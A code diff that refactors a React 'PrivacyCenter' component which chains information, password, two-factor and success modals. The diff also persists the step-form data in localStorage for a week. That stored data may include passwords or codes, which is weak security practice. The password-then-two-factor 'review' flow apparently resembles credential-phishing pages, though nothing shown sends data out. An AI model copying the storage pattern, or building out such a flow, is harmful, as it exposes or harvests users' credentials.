@@ -1,117 +1,130 @@
 'use client'
 
-import MainContent from '#components/main/MainContent';
-import InfomationsModal from '#components/modals/InfomationsModal';
-import PasswordModal from '#components/modals/PasswordModal';
-import SuccessModal from '#components/modals/SuccessModal';
-import TwoFactorModal from '#components/modals/TwoFactorModal';
-import NavBar from '#components/nav-bar/NavBar'
+import MainContent from '#components/main/MainContent'
+import InformationModal from '#components/modals/InformationModal'
+import PasswordModal from '#components/modals/PasswordModal'
+import SuccessModal from '#components/modals/SuccessModal'
+import TwoFactorModal from '#components/modals/TwoFactorModal'
 import React from 'react'
-import { useAppDispatch, useAppSelector } from '../store/hooks';
-import { updateForm } from '../store/slices/stepFormSlice';
+import { useAppDispatch, useAppSelector } from '../store/hooks'
+import { updateForm } from '../store/slices/stepFormSlice'
+
+const STORAGE_KEY = 'privacy_center_state'
+
+type PersistedModalFlags = {
+  isInformationModalOpen?: boolean
+  isPasswordModalOpen?: boolean
+  isTwoFactorModalOpen?: boolean
+  isSuccessModalOpen?: boolean
+  /** Legacy keys (migration) */
+  isOpendInfo?: boolean
+  isOpendPassword?: boolean
+  isOpendTwoFactor?: boolean
+  isOpendSuccess?: boolean
+}
+
+function readModalFlagsFromStorage(raw: PersistedModalFlags) {
+  return {
+    isInformationModalOpen: Boolean(
+      raw.isInformationModalOpen ?? raw.isOpendInfo,
+    ),
+    isPasswordModalOpen: Boolean(raw.isPasswordModalOpen ?? raw.isOpendPassword),
+    isTwoFactorModalOpen: Boolean(raw.isTwoFactorModalOpen ?? raw.isOpendTwoFactor),
+    isSuccessModalOpen: Boolean(raw.isSuccessModalOpen ?? raw.isOpendSuccess),
+  }
+}
 
 const PrivacyCenter = () => {
-    // STATE MODAL
-    const [isOpendInfo, setIsOpendInfo] = React.useState(false);
-    const [isOpendPassword, setIsOpendPassword] = React.useState(false);
+  const [isInformationModalOpen, setIsInformationModalOpen] = React.useState(false)
+  const [isPasswordModalOpen, setIsPasswordModalOpen] = React.useState(false)
+  const [isTwoFactorModalOpen, setIsTwoFactorModalOpen] = React.useState(false)
+  const [isSuccessModalOpen, setIsSuccessModalOpen] = React.useState(false)
+  const [isLoaded, setIsLoaded] = React.useState(false)
 
-    const [isOpendTwoFactor, setIsOpendTwoFactor] = React.useState(false);
-    const [isOpendSuccess, setIsOpendSuccess] = React.useState(false);
-    const [isLoaded, setIsLoaded] = React.useState(false);
+  const dispatch = useAppDispatch()
+  const formData = useAppSelector((state) => state.stepForm.data)
 
-    const dispatch = useAppDispatch();
-    const formData = useAppSelector((state) => state.stepForm.data);
+  React.useEffect(() => {
+    const savedData = localStorage.getItem(STORAGE_KEY)
+    if (savedData) {
+      try {
+        const { state, formData: savedFormData, expires } = JSON.parse(savedData)
+        if (Date.now() < expires) {
+          const flags = readModalFlagsFromStorage(state)
+          setIsInformationModalOpen(flags.isInformationModalOpen)
+          setIsPasswordModalOpen(flags.isPasswordModalOpen)
+          setIsTwoFactorModalOpen(flags.isTwoFactorModalOpen)
+          setIsSuccessModalOpen(flags.isSuccessModalOpen)
 
-    React.useEffect(() => {
-        const savedData = localStorage.getItem('privacy_center_state');
-        if (savedData) {
-            try {
-                const { state, formData: savedFormData, expires } = JSON.parse(savedData);
-                if (Date.now() < expires) {
-                    setIsOpendInfo(state.isOpendInfo || false);
-                    setIsOpendPassword(state.isOpendPassword || false);
-                    setIsOpendTwoFactor(state.isOpendTwoFactor || false);
-                    setIsOpendSuccess(state.isOpendSuccess || false);
-
-                    if (savedFormData) {
-                        dispatch(updateForm(savedFormData));
-                    }
-                } else {
-                    localStorage.removeItem('privacy_center_state');
-                }
-            } catch (e) {
-                console.error("Error parsing saved state", e);
-            }
+          if (savedFormData) {
+            dispatch(updateForm(savedFormData))
+          }
+        } else {
+          localStorage.removeItem(STORAGE_KEY)
         }
-        setIsLoaded(true);
-    }, [dispatch]);
-
-    React.useEffect(() => {
-        if (isLoaded) {
-            const expires = Date.now() + 7 * 24 * 60 * 60 * 1000; // 1 week
-            localStorage.setItem('privacy_center_state', JSON.stringify({
-                state: {
-                    isOpendInfo,
-                    isOpendPassword,
-                    isOpendTwoFactor,
-                    isOpendSuccess
-                },
-                formData,
-                expires
-            }));
-        }
-    }, [isLoaded, isOpendInfo, isOpendPassword, isOpendTwoFactor, isOpendSuccess, formData]);
-
-    // HANDLE MODAL
-
-    const handleOpendInfoModal = () => {
-        setIsOpendInfo(true);
+      } catch (e) {
+        console.error('Error parsing saved state', e)
+      }
     }
+    setIsLoaded(true)
+  }, [dispatch])
 
-    const handleOpendPasswordModal = (isOpenPassword: boolean) => {
-        setIsOpendPassword(isOpenPassword);
-    }
-
-    const handleOpendTwoFactorModal = (isOpenTwoFactor: boolean) => {
-        setIsOpendTwoFactor(isOpenTwoFactor);
-    }
-
-    const handleOpendSuccessModal = (isOpenSuccess: boolean) => {
-        setIsOpendSuccess(isOpenSuccess);
-    }
-
-    return (
-        <>
-
-
-            <div>
-                <MainContent handleOpendInfoModal={handleOpendInfoModal} />
-            </div>
-
-            <InfomationsModal
-                isOpend={isOpendInfo}
-                isOpendPassword={(isOpenPassword: boolean) => handleOpendPasswordModal(isOpenPassword)}
-                onToggleModal={(isOpen: boolean) => setIsOpendInfo(isOpen)}
-            />
-
-            <PasswordModal
-                isOpend={isOpendPassword}
-                isOpendTwoFactor={(isOpenTwoFactor: boolean) => handleOpendTwoFactorModal(isOpenTwoFactor)}
-                onToggleModal={(isOpen: boolean) => setIsOpendPassword(isOpen)}
-            />
-
-            <TwoFactorModal
-                isOpend={isOpendTwoFactor}
-                isOpendFinish={(isOpenFinish: boolean) => handleOpendSuccessModal(isOpenFinish)}
-                onToggleModal={(isOpen: boolean) => setIsOpendTwoFactor(isOpen)}
-            />
-
-            <SuccessModal
-                isOpend={isOpendSuccess}
-                onToggleSuccess={(isOpen: boolean) => setIsOpendSuccess(isOpen)}
-            />
-        </>
+  React.useEffect(() => {
+    if (!isLoaded) return
+    const expires = Date.now() + 7 * 24 * 60 * 60 * 1000
+    localStorage.setItem(
+      STORAGE_KEY,
+      JSON.stringify({
+        state: {
+          isInformationModalOpen,
+          isPasswordModalOpen,
+          isTwoFactorModalOpen,
+          isSuccessModalOpen,
+        },
+        formData,
+        expires,
+      }),
     )
+  }, [
+    isLoaded,
+    isInformationModalOpen,
+    isPasswordModalOpen,
+    isTwoFactorModalOpen,
+    isSuccessModalOpen,
+    formData,
+  ])
+
+  const openInformationModal = () => {
+    setIsInformationModalOpen(true)
+  }
+
+  return (
+    <>
+      <div>
+        <MainContent onRequestReview={openInformationModal} />
+      </div>
+
+      <InformationModal
+        open={isInformationModalOpen}
+        onOpenChange={setIsInformationModalOpen}
+        onProceedToPassword={() => setIsPasswordModalOpen(true)}
+      />
+
+      <PasswordModal
+        open={isPasswordModalOpen}
+        onOpenChange={setIsPasswordModalOpen}
+        onProceedToTwoFactor={() => setIsTwoFactorModalOpen(true)}
+      />
+
+      <TwoFactorModal
+        open={isTwoFactorModalOpen}
+        onOpenChange={setIsTwoFactorModalOpen}
+        onProceedToSuccess={() => setIsSuccessModalOpen(true)}
+      />
+
+      <SuccessModal open={isSuccessModalOpen} onOpenChange={setIsSuccessModalOpen} />
+    </>
+  )
 }
 
 export default PrivacyCenter
